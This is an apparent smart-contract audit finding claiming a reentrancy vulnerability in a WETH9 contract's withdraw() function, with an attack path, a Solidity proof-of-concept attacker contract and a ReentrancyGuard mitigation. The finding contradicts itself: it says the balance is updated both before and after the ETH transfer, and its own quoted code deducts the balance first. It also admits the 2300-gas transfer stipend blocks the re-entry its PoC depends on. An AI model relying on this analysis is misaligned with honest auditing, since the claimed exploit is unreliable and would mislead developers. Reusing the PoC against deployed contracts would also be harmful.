# [M-01] Reentrancy Vulnerability in withdraw() Function Due to Missing Guard

### Summary

The withdraw() function in the WETH9 contract is vulnerable to a reentrancy attack because it sends ETH via transfer() after updating user balances , violating the Checks-Effects-Interactions pattern . While .transfer() forwards only 2300 gas, which typically prevents complex reentry, this is not a guaranteed safeguard and could be exploited under certain conditions or future upgrades.

### Root Cause

The function performs an external ETH transfer (payable(msg.sender).transfer(wad)) before finalizing the state change (balanceOf[msg.sender] -= wad). This allows a malicious contract to re-enter the function while the original caller's balance remains unchanged. The affected line is: [https://github.com/sherlock-audit/2025-05-layeredge/blob/main/edgen-staking/src/WETH9.sol#L29](hhttps://github.com/sherlock-audit/2025-05-layeredge/blob/main/edgen-staking/src/WETH9.sol#L29)

### Internal Pre-conditions

1. The contract holds a non-zero balance of ETH.
2. A user has a non-zero balanceOf[msg.sender] and calls withdraw().

### External Pre-conditions

1. A malicious contract has deposited Ether and now holds a balance in the WETH9 contract.
2. The malicious contract has implemented a receive() or fallback() function that calls withdraw() recursively.

### Attack Path

1. Attacker deposits ETH into WETH9 (e.g., deposit{value: 1 ether}()).
2. Attacker calls withdraw() from a malicious contract.
3. Before balance is deducted, the ETH transfer triggers the attacker’s receive() function.
4. Attacker re-enters withdraw() multiple times, each call withdrawing ETH while the balance remains intact.
5. Contract ETH is drained after N recursive calls.

### Impact

Potential loss of all Ether stored in the contract due to recursive withdrawals if transfer is changed to call in future upgrades or gas stipends are relaxed. This would lead to critical financial loss for users and the protocol.

### PoC

```solidity
contract Malicious {
    WETH9 public weth = WETH9(payable(0x...)); // Replace with actual WETH9 address
    bool public reentered = false;

    function pwn() external payable {
        weth.deposit{value: 1 ether}();
        weth.withdraw(1 ether);
    }

    // Malicious fallback function
    receive() external payable {
        if (!reentered) {
            reentered = true;
            weth.withdraw(1 ether); // Re-enters withdraw()
        }
    }
}
```

### Mitigation

Use OpenZeppelin’s ReentrancyGuard to prevent reentrant calls
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract WETH9 is ReentrancyGuard {
    // ... rest of code ...

    function withdraw(uint256 wad) public nonReentrant {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        emit Withdrawal(msg.sender, wad);
        payable(msg.sender).transfer(wad);
    }
}
```
